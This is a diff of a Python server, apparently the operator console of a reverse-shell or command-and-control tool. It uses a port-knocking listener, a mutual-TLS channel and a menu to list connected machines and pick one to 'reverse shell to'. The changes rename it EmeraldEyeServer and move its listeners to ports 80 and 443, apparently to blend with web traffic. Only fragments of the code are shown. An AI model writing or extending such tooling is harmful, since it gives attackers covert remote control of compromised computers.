@@ -2,15 +2,13 @@ import socket
 import threading
 from OpenSSL import crypto
 import ssl
-import time
 
-KNOCK_PORT = 31415
-HTTPS_PORT = 31416
+KNOCK_PORT = 80
+TLS_PORT = 443
 
-HOST = socket.gethostbyname(socket.gethostname())
+HOST = "0.0.0.0"
 
-class ThreadedServer():
-
+class EmeraldEyeServer():
 
     def __init__(self, host):
         self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -90,7 +88,7 @@ class ThreadedServer():
         context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH, cafile=self.tls_other_crt_file)
         context.verify_mode = ssl.CERT_REQUIRED
         context.load_cert_chain(certfile=self.tls_cert_file, keyfile=self.tls_private_key_file)
-        self.sock.bind((self.host, HTTPS_PORT))
+        self.sock.bind((self.host, TLS_PORT))
         self.sock.listen(5)
         new_sock, addy = self.sock.accept()
         con = context.wrap_socket(new_sock, server_side=True)
@@ -128,11 +126,11 @@ class ThreadedServer():
         con.close()
 
 def main():
-    t = ThreadedServer(HOST)
+    t = EmeraldEyeServer(HOST)
     while True:
         print("Please enter selection:")
         print("Listed connected machines - 1")
-        print("Select machine to connect to - 2")
+        print("Select machine to reverse shell to - 2")
         select = input(">")
         if select == "1":
             print(t.ping_threads.keys())
